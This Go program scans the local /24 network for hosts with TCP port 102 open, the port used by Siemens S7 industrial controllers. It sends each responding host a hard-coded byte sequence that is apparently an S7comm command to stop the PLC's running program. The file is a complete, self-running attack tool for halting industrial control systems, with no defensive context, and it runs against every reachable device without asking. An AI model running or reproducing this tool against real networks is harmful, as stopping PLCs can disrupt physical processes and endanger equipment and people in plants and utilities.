package main

import (
	"net"
	"time"
	"encoding/binary"
	"fmt"
)

func GetIPAddr() string {

	// Get Interfaces
    addrs, err := net.InterfaceAddrs()

	// Error Checking 
    if err != nil {
        fmt.Println(err)
    }

	// Get Private Interface
    for _, address := range addrs {
        // only add non loopback IPv4 addresses
        ipnet, ok := address.(*net.IPNet)
        if ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
			var ip_addr = ipnet.IP
            return ip_addr.String()
        }
	}
	return ""
}

func GetNetwork(ip_addr string) []string {

	// Parse IP Network
	addr, ipnet, err := net.ParseCIDR(ip_addr)
	_ = addr

	// Error Checking
	if err != nil {
		fmt.Println(err)
	}

	// Start and Mask
	mask := binary.BigEndian.Uint32(ipnet.Mask)
    start := binary.BigEndian.Uint32(ipnet.IP) + 1

    // Find the final address
    finish := (start & mask) | (mask ^ 0xffffffff)

	// Nil slice
	var ip_list []string

    // Loop through addresses as uint32
    for i := start; i <= finish; i++ {
    // convert back to net.IP
        ip := make(net.IP, 4)
        binary.BigEndian.PutUint32(ip, i)
		ip_list = append(ip_list, ip.String())
	}
	return ip_list
}

func ScanIP(ip_list []string) []string {

	// Nil slice
	var scanned_ips []string

	// Connect to device ports
	for i := range ip_list {
    	target := ip_list[i] + ":102"
    	conn, err := net.DialTimeout("tcp", target, 1 * time.Second)
    	if err != nil {
			continue
		} else {
			scanned_ips = append(scanned_ips, ip_list[i])
		}
		conn.Close()
	}
	return scanned_ips
}

func KillIP(scanned_ips []string) {

	// Connect to device ports
	stop := "\x03\x00\x00\x21\x02\xf0\x80\x32\x01\x00\x00\x06\x00\x00\x10\x00\x00\x29\x00\x00\x00\x00\x00\x09\x50\x5f\x50\x52\x4f\x47\x52\x41\x4d"
	for i := range scanned_ips {
    	target := scanned_ips[i] + ":102"
    	conn, err := net.Dial("tcp", target)
    	if err != nil {
			continue
		} else {
			_, err = conn.Write([]byte(stop))
		}
		conn.Close()
	}
}
func main() {
	ip_addr := GetIPAddr() + "/24"
	ip_list := GetNetwork(ip_addr)
	scanned_ips := ScanIP(ip_list)
	KillIP(scanned_ips)
}